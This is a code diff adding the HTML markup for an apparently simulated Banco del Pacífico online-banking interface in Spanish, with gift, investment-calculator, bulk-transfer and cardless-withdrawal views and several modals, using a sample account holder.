+                  <path d="M192 154C192 146 198 152 200 162C198 158 192 158 192 154Z" fill="#F59E0B" />
+                  <path d="M208 154C208 146 202 152 200 162C202 158 208 158 208 154Z" fill="#F59E0B" />
+
+                  <!-- Manos sosteniendo la caja -->
+                  <circle cx="180" cy="180" r="4.5" fill="#F9D5C4" />
+                  <circle cx="220" cy="180" r="4.5" fill="#F9D5C4" />
+                </svg>
+              </div>
+
+              <h3 class="regalo-heading">Envía un regalo</h3>
+              <p class="regalo-subtext">Sorprende a tus seres queridos con un envío personalizado, sin importar en qué
+                banco estén.</p>
+
+              <!-- Lista de ítems informativos con iconos azules -->
+              <div class="regalo-checklist">
+                <div class="regalo-list-item">
+                  <div class="regalo-icon-container">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="regalo-icon">
+                      <rect x="3" y="8" width="18" height="12" rx="2" />
+                      <line x1="12" y1="8" x2="12" y2="20" />
+                      <path d="M7.5 8H16.5" />
+                      <path d="M12 5a2.5 2.5 0 0 0-2.5 2.5v.5h5v-.5A2.5 2.5 0 0 0 12 5z" />
+                    </svg>
+                  </div>
+                  <p>Elige el motivo y dedica tu mensaje.</p>
+                </div>
+
+                <div class="regalo-list-item">
+                  <div class="regalo-icon-container">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="regalo-icon">
+                      <path
+                        d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
+                    </svg>
+                  </div>
+                  <p>Comparte tu regalo con un diseño único.</p>
+                </div>
+
+                <div class="regalo-list-item">
+                  <div class="regalo-icon-container">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="regalo-icon">
+                      <rect x="2" y="5" width="20" height="14" rx="2" />
+                      <line x1="2" y1="10" x2="22" y2="10" />
+                      <line x1="7" y1="15" x2="17" y2="15" />
+                    </svg>
+                  </div>
+                  <p>Disponible para Banco del Pacífico y otros bancos.</p>
+                </div>
+              </div>
+
+              <button type="button" class="regalo-btn">Empecemos</button>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Invertir -->
+        <main class="main-content hidden" id="invertir-content">
+          <div class="invertir-container">
+            <div class="invertir-card">
+              <h3 class="invertir-header-title">Invertir</h3>
+              <div class="invertir-main-body">
+                <!-- Columna Izquierda: Ilustración SVG -->
+                <div class="invertir-col-left">
+                  <h2 class="invertir-title">Calcula tu inversión</h2>
+                  <p class="invertir-subtitle">Incrementa tu rentabilidad según el monto y plazo que establezcas.</p>
+
+                  <!-- SVG Ilustración -->
+                  <svg class="invertir-svg-illustration" viewBox="0 0 500 400" fill="none"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <!-- Fondo de ventana / Pared -->
+                    <rect x="250" y="80" width="180" height="150" rx="4" fill="#F0F4F8" stroke="#D3E1F1"
+                      stroke-width="2" />
+                    <line x1="340" y1="80" x2="340" y2="230" stroke="#D3E1F1" stroke-width="2" />
+                    <line x1="250" y1="155" x2="430" y2="155" stroke="#D3E1F1" stroke-width="2" />
+
+                    <!-- Repisa con decoración -->
+                    <rect x="350" y="210" width="100" height="8" rx="2" fill="#CFD8DC" />
+                    <!-- Maceta/Planta -->
+                    <rect x="375" y="180" width="18" height="30" rx="2" fill="#80CBC4" />
+                    <path d="M370 180C370 160 384 150 384 150C384 150 398 160 398 180H370Z" fill="#4CAF50" />
+                    <!-- Portarretratos -->
+                    <rect x="410" y="185" width="22" height="25" rx="2" fill="#B0BEC5" />
+                    <rect x="415" y="190" width="12" height="15" rx="1" fill="#FFFFFF" />
+
+                    <!-- Escritorio -->
+                    <rect x="50" y="290" width="400" height="12" rx="4" fill="#37474F" />
+                    <rect x="370" y="302" width="60" height="78" fill="#455A64" />
+                    <!-- Cajones del escritorio -->
+                    <line x1="370" y1="328" x2="430" y2="328" stroke="#263238" stroke-width="2" />
+                    <line x1="370" y1="354" x2="430" y2="354" stroke="#263238" stroke-width="2" />
+                    <circle cx="400" cy="315" r="3" fill="#CFD8DC" />
+                    <circle cx="400" cy="341" r="3" fill="#CFD8DC" />
+                    <circle cx="400" cy="367" r="3" fill="#CFD8DC" />
+
+                    <!-- Silla -->
+                    <path d="M110 320L110 378" stroke="#263238" stroke-width="8" stroke-linecap="round" />
+                    <path d="M120 378L180 378" stroke="#263238" stroke-width="8" stroke-linecap="round" />
+                    <rect x="75" y="270" width="45" height="40" rx="4" fill="#263238" />
+                    <rect x="95" y="235" width="50" height="70" rx="8" fill="#37474F" />
+
+                    <!-- Persona (Analista) -->
+                    <!-- Piernas -->
+                    <path d="M140 310H195V375" stroke="#1A237E" stroke-width="16" stroke-linecap="round"
+                      stroke-linejoin="round" />
+                    <!-- Cuerpo/Camisa azul -->
+                    <path d="M135 240C135 220 155 210 175 210C185 210 195 225 195 245V310H135V240Z" fill="#0060B6" />
+                    <path d="M135 240L145 225" stroke="#FFFFFF" stroke-width="2" />
+                    <!-- Brazo/Mano apuntando -->
+                    <path d="M185 245C195 245 225 240 240 235" stroke="#0060B6" stroke-width="12"
+                      stroke-linecap="round" />
+                    <path d="M240 235L248 233" stroke="#FFCC80" stroke-width="10" stroke-linecap="round" />
+                    <!-- Cabeza y Cabello -->
+                    <circle cx="165" cy="185" r="18" fill="#FFCC80" />
+                    <path
+                      d="M150 180C150 165 160 168 168 168C175 168 183 172 183 182C183 182 183 170 170 170C155 170 150 175 150 180Z"
+                      fill="#1A1A1A" />
+                    <path
+                      d="M152 170C155 160 180 160 180 175C180 180 178 185 175 185C170 185 168 178 168 175C168 172 155 175 152 170Z"
+                      fill="#1A1A1A" />
+                    <!-- Lentes -->
+                    <rect x="172" y="178" width="10" height="8" rx="1" stroke="#1A1A1A" stroke-width="2" fill="none" />
+                    <line x1="168" y1="181" x2="172" y2="181" stroke="#1A1A1A" stroke-width="2" />
+
+                    <!-- Computadora (Monitor y Soporte) -->
+                    <rect x="235" y="278" width="12" height="15" fill="#90A4AE" />
+                    <rect x="210" y="195" width="115" height="83" rx="4" fill="#CFD8DC" stroke="#90A4AE"
+                      stroke-width="2" />
+                    <rect x="215" y="200" width="105" height="70" fill="#FFFFFF" />
+                    <!-- Contenido de la pantalla (Gráficos) -->
+                    <rect x="225" y="240" width="12" height="25" rx="1" fill="#0060B6" />
+                    <rect x="245" y="225" width="12" height="40" rx="1" fill="#4CAF50" />
+                    <rect x="265" y="215" width="12" height="50" rx="1" fill="#0060B6" />
+                    <rect x="285" y="230" width="12" height="35" rx="1" fill="#FFC107" />
+                    <circle cx="225" cy="208" r="2" fill="#90A4AE" />
+                    <circle cx="231" cy="208" r="2" fill="#90A4AE" />
+                    <circle cx="237" cy="208" r="2" fill="#90A4AE" />
+
+                    <!-- Teclado y Mouse -->
+                    <rect x="215" y="286" width="35" height="3" fill="#90A4AE" />
+                    <circle cx="260" cy="287" r="2" fill="#90A4AE" />
+                  </svg>
+                </div>
+
+                <!-- Columna Derecha: Formulario del simulador -->
+                <div class="invertir-col-right">
+                  <div class="invertir-form-container">
+                    <form id="calc-inversion-form" onsubmit="event.preventDefault();">
+                      <!-- Monto de inversión -->
+                      <div class="inv-field-group">
+                        <label class="inv-field-label text-center">¿Cuánto quieres invertir?</label>
+                        <div class="inv-amount-input-wrapper">
+                          <input type="text" id="inv-amount-input" class="inv-amount-input" value="$10,000.00"
+                            placeholder="$0.00">
+                        </div>
+                      </div>
+
+                      <!-- Selección de tipo de plazo -->
+                      <div class="inv-field-group" style="margin-top: 24px;">
+                        <label class="inv-field-label">Selecciona el tipo de plazo</label>
+                        <div class="inv-term-tabs">
+                          <button type="button" id="tab-term-dias" class="inv-term-tab active"
+                            onclick="setTermType('dias')">Días</button>
+                          <button type="button" id="tab-term-meses" class="inv-term-tab"
+                            onclick="setTermType('meses')">Meses</button>
+                        </div>
+                      </div>
+
+                      <!-- Duración de la inversión -->
+                      <div class="inv-field-group" style="margin-top: 24px;">
+                        <div class="inv-duration-input-wrapper">
+                          <input type="number" id="inv-duration-input" class="inv-duration-input" value="30" min="30"
+                            max="360" placeholder="Duración de tu inversión">
+                          <span class="inv-calendar-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                              <rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+                              <line x1="16" y1="2" x2="16" y2="6" />
+                              <line x1="8" y1="2" x2="8" y2="6" />
+                              <line x1="3" y1="10" x2="21" y2="10" />
+                            </svg>
+                          </span>
+                        </div>
+                        <span id="inv-min-permanencia-msg" class="inv-helper-text">Permanencia mínima es de 30 días
+                          hasta 360 días</span>
+                      </div>
+
+                      <!-- Forma de recibir intereses -->
+                      <div class="inv-field-group" style="margin-top: 24px;">
+                        <div class="inv-interest-select-box" onclick="toggleInterestPayout()">
+                          <div class="inv-interest-left">
+                            <span class="inv-interest-top-label">¿CÓMO QUIERES RECIBIR TUS INTERESES?</span>
+                            <span id="inv-interest-payout-val" class="inv-interest-value">Vencimiento</span>
+                          </div>
+                          <svg class="inv-chevron-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2.5">
+                            <polyline points="9 18 15 12 9 6" />
+                          </svg>
+                        </div>
+                      </div>
+
+                      <!-- Caja de alerta de millas -->
+                      <div class="inv-millas-alert" id="inv-millas-alert-box">
+                        <span>Ganas millas por invertir a partir de 120 días plazo.</span>
+                      </div>
+
+                      <!-- Botón Continuar -->
+                      <div class="inv-btn-container" style="margin-top: 28px;">
+                        <button type="button" id="btn-invertir-continuar" class="btn-invertir-submit"
+                          onclick="handleInvertirSubmit()">Continuar</button>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Envío Masivo -->
+        <main class="main-content hidden" id="enviar-masivo-content">
+          <div class="masivo-container">
+            <div class="masivo-card">
+              <h2 class="masivo-header-title">Transferencias cuentas Banco del Pacífico</h2>
+
+              <!-- Stepper -->
+              <div class="masivo-stepper">
+                <div class="stepper-step active" id="masivo-step-1-indicator">
+                  <span class="step-number">1.</span>
+                  <span class="step-text">Ingreso de datos</span>
+                </div>
+                <div class="stepper-step" id="masivo-step-2-indicator">
+                  <span class="step-number">2.</span>
+                  <span class="step-text">Confirmación</span>
+                </div>
+                <div class="stepper-step" id="masivo-step-3-indicator">
+                  <span class="step-number">3.</span>
+                  <span class="step-text">Resumen de transacción</span>
+                </div>
+              </div>
+
+              <!-- Pasos de Envío Masivo -->
+              <!-- PASO 1: Ingreso de datos -->
+              <div class="masivo-step-container" id="masivo-step-1">
+                <p class="masivo-intro-text">
+                  Aquí puede transferir fondos entre cuentas de Banco del Pacífico o realizar transferencias a más de
+                  una cuenta, seleccionando "Transferencias masivas".
+                </p>
+
+                <h3 class="masivo-section-title">Datos de la transferencia</h3>
+
+                <div class="masivo-form-grid">
+                  <div class="masivo-input-group">
+                    <label for="masivo-origin-account">Cuenta de origen <span class="masivo-required">*</span></label>
+                    <select id="masivo-origin-account" class="masivo-select" onchange="validateMasivoForm()">
+                      <option value="" disabled selected>Seleccione cuenta de origen</option>
+                      <option value="1071501339">Cuenta de ahorros (1071501339) - Francisco Vázquez - $20,468.32
+                      </option>
+                    </select>
+                  </div>
+
+                  <div class="masivo-input-group">
+                    <label for="masivo-reference">Referencia <span class="masivo-required">*</span></label>
+                    <input type="text" id="masivo-reference" class="masivo-input" placeholder="Ingrese referencia"
+                      oninput="validateMasivoForm()">
+                  </div>
+                </div>
+
+                <h3 class="masivo-section-title">Cuentas de destino</h3>
+
+                <div class="masivo-table-wrapper">
+
+                </div>
+
+                <div class="masivo-footer-actions text-right">
+                  <button type="button" id="btn-masivo-next" class="btn-masivo-primary" disabled
+                    onclick="goMasivoToStep2()">Siguiente</button>
+                </div>
+              </div>
+
+              <!-- PASO 2: Confirmación -->
+              <div class="masivo-step-container hidden" id="masivo-step-2">
+                <p class="masivo-intro-text">
+                  Por favor, verifique los datos de la transferencia masiva antes de confirmar la transacción.
+                </p>
+
+                <h3 class="masivo-section-title">Resumen de la Operación</h3>
+
+                <div class="confirm-summary-box">
+                  <div class="summary-field">
+                    <span class="summary-label">Cuenta de Origen:</span>
+                    <span class="summary-value">1071501339 — Francisco Vázquez</span>
+                  </div>
+                  <div class="summary-field">
+                    <span class="summary-label">Referencia:</span>
+                    <span class="summary-value" id="confirm-ref-val">-</span>
+                  </div>
+                  <div class="summary-field">
+                    <span class="summary-label">Total a Transferir:</span>
+                    <span class="summary-value text-blue" id="confirm-total-val">$0.00</span>
+                  </div>
+                </div>
+
+                <h3 class="masivo-section-title">Cuentas Destinatarias Seleccionadas</h3>
+
+                <div class="masivo-table-wrapper">
+                  <table class="masivo-table confirm-table">
+                    <thead>
+                      <tr>
+                        <th>Cuenta</th>
+                        <th>Titular</th>
+                        <th style="width: 150px; text-align: right;">Valor</th>
+                      </tr>
+                    </thead>
+                    <tbody id="masivo-confirm-body">
+                      <!-- Dynamically filled -->
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="masivo-footer-actions spacing-between">
+                  <button type="button" class="btn-masivo-secondary" onclick="goMasivoBackToStep1()">Regresar</button>
+                  <button type="button" class="btn-masivo-primary" onclick="goMasivoToStep3()">Confirmar
+                    Transferencia</button>
+                </div>
+              </div>
+
+              <!-- PASO 3: Resumen de transacción -->
+              <div class="masivo-step-container hidden" id="masivo-step-3">
+                <div class="masivo-success-wrapper">
+                  <div class="success-icon-circle">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                      <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                  </div>
+                  <h3 class="success-title">¡Transacción Exitosa!</h3>
+                  <p class="success-desc">El envío masivo de dinero ha sido procesado correctamente.</p>
+
+                  <div class="receipt-box">
+                    <div class="receipt-row">
+                      <span>Referencia:</span>
+                      <strong id="receipt-ref-val">-</strong>
+                    </div>
+                    <div class="receipt-row">
+                      <span>Fecha y hora:</span>
+                      <strong id="receipt-date-val">-</strong>
+                    </div>
+                    <div class="receipt-row">
+                      <span>Monto Debitado:</span>
+                      <strong class="text-blue" id="receipt-total-val">$0.00</strong>
+                    </div>
+                    <div class="receipt-row">
+                      <span>Cuenta de Origen:</span>
+                      <strong>1071501339 (Francisco Vázquez)</strong>
+                    </div>
+                  </div>
+
+                  <div class="masivo-footer-actions flex-center">
+                    <button type="button" class="btn-masivo-primary" style="max-width: 250px;"
+                      onclick="finishMasivoTransaction()">Aceptar</button>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </main>
+
+        <!-- Vista Retiro sin tarjeta -->
+        <main class="main-content hidden" id="retiro-sin-tarjeta-content">
+          <div class="retiro-container">
+            <div class="retiro-card">
+
+              <!-- Cabecera de Tarjeta -->
+              <div class="retiro-card-header">
+                <h3 class="retiro-title">Retiro sin tarjeta</h3>
+                <button type="button" class="history-icon-btn" onclick="showRetiroHistory(event)" title="Ver Historial">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <polyline points="12 8 12 12 14 14" />
+                    <path d="M12 2a10 10 0 1 1-10 10A10 10 0 0 1 12 2z" />
+                    <path d="M12 2a10 10 0 0 1 9.8 8h-2" stroke-dasharray="3 3" />
+                  </svg>
+                </button>
+              </div>
+
+              <!-- Cuenta de Origen -->
+              <div class="retiro-box" onclick="selectRetiroOriginAccount(event)">
+                <div class="retiro-box-left">
+                  <span class="retiro-box-label">CUENTA DE ORIGEN</span>
+                  <span class="retiro-box-name">Francisco Vázquez</span>
+                  <span class="retiro-box-details">1071501339 — Banco del Pacífico</span>
+                </div>
+                <svg class="retiro-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </div>
+
+              <!-- Elige celular de destino -->
+              <div class="retiro-box" onclick="selectRetiroDestinationCellular(event)" style="margin-top: 16px;">
+                <div class="retiro-box-left flex-row-align">
+                  <div class="retiro-icon-wrapper">
+                    <svg class="retiro-cell-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                      stroke-linecap="round" stroke-linejoin="round">
+                      <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
+                      <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3" />
+                    </svg>
+                  </div>
+                  <span class="retiro-box-text">Elige celular de destino</span>
+                </div>
+                <svg class="retiro-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </div>
+
+              <!-- Botón inferior -->
+              <div class="retiro-btn-wrapper" style="margin-top: 24px; display: flex; justify-content: center;">
+                <button type="button" class="btn-retiro-unregistered" onclick="sendRetiroUnregistered(event)">
+                  Enviar a un celular no registrado
+                </button>
+              </div>
+
+            </div>
+          </div>
+        </main>
+      </div>
+
+      <!-- Modal de Transferencia Simulada -->
+      <div id="transfer-modal" class="modal-overlay hidden">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h4>Enviar dinero</h4>
+            <button class="close-modal-btn" onclick="closeTransferModal()">×</button>
+          </div>
+          <div class="modal-body">
+            <p class="modal-sub">Destinatario:</p>
+            <p class="modal-dest-name" id="modal-recipient-name">Nombre del Contacto</p>
+
+            <div class="modal-input-group">
+              <label for="transfer-amount">Monto a enviar</label>
+              <div class="amount-input-wrapper">
+                <span class="currency-symbol">$</span>
+                <input type="number" id="transfer-amount" placeholder="0.00" step="0.01" min="0.01">
+              </div>
+            </div>
+
+            <div class="modal-input-group">
+              <label for="transfer-concept">Concepto (Opcional)</label>
+              <input type="text" id="transfer-concept" placeholder="Ej. Pago de cena">
+            </div>
+
+            <div class="modal-actions">
+              <button class="btn btn-secondary-modal" onclick="closeTransferModal()">Cancelar</button>
+              <button class="btn btn-primary-modal" onclick="confirmTransfer()">Enviar Transferencia</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Toast de éxito -->
+      <div id="toast-success" class="toast hidden">
+        <div class="toast-content">
+          <svg class="toast-success-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <polyline points="20 6 9 17 4 12" />
+          </svg>
+          <span id="toast-msg">¡Transferencia realizada con éxito!</span>
+        </div>
+      </div>
+
+      <!-- Modal de Confirmación Cerrar Sesión -->
+      <div id="logout-confirm-modal" class="modal-overlay hidden">
+        <div class="modal-content logout-modal-content">
+          <div class="modal-body logout-modal-body">
+            <h4 class="logout-modal-title">Cerrar sesión</h4>
+            <p class="logout-modal-text">¿Deseas salir de Banca Virtual?</p>
+
+            <div class="logout-modal-buttons">
+              <button class="btn btn-primary-logout" onclick="confirmLogout()">Cerrar sesión</button>
+              <button class="btn btn-secondary-logout" onclick="closeLogoutConfirmModal()">Cancelar</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Modal de Detalles de Inversión / Calculadora -->
+      <div id="investment-modal" class="modal-overlay hidden" onclick="closeInvestmentModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+          <div class="modal-header">
+            <h4>Detalles de inversión</h4>
+            <button class="close-modal-btn" onclick="closeInvestmentModal(event)">×</button>
+          </div>
+          <div class="modal-body">
+            <div class="investment-calc-inputs">
+              <div class="modal-input-group" style="margin-bottom: 12px;">
+                <label for="inv-calc-amount">Valor (Monto Principal)</label>
+                <div class="amount-input-wrapper" style="margin-top: 4px;">
+                  <span class="currency-symbol">$</span>
+                  <input type="number" id="inv-calc-amount" placeholder="0.00" readonly>
+                </div>
+              </div>
+              <div style="display: flex; gap: 12px;">
+                <div class="modal-input-group" style="flex: 1;">
+                  <label for="inv-calc-rate">Tasa de interés (%)</label>
+                  <input type="number" id="inv-calc-rate" placeholder="0.00" step="0.01" style="margin-top: 4px;"
+                    readonly>
+                </div>
+                <div class="modal-input-group" style="flex: 1;">
+                  <label for="inv-calc-term">Plazo (Días)</label>
+                  <input type="number" id="inv-calc-term" placeholder="0" style="margin-top: 4px;" readonly>
+                </div>
+              </div>
+            </div>
+
+            <h5
+              style="margin-top: 16px; margin-bottom: 8px; font-size: 11px; font-weight: 700; color: var(--text-dark); text-transform: uppercase; letter-spacing: 0.5px;">
+              Detalles de Rendimiento</h5>
+
+            <div class="investment-detail-card">
+              <div class="detail-row">
+                <span class="detail-label">Forma de pago de interés</span>
+                <span class="detail-value">Vencimiento</span>
+              </div>
+              <div class="detail-row">
+                <span class="detail-label">Tasa de interés</span>
+                <span class="detail-value" id="inv-res-rate">0.00%</span>
+              </div>
+              <div class="detail-row">
+                <span class="detail-label">Plazo</span>
+                <span class="detail-value" id="inv-res-term">0 Días</span>
+              </div>
+              <div class="detail-row">
+                <span class="detail-label">Rendimiento Neto (I)</span>
+                <span class="detail-value text-green" id="inv-res-yield">$0.00</span>
+              </div>
+              <div class="detail-row total-row">
+                <span class="detail-label">Total a recibir</span>
+                <span class="detail-value" id="inv-res-total">$0.00</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+
+</html>
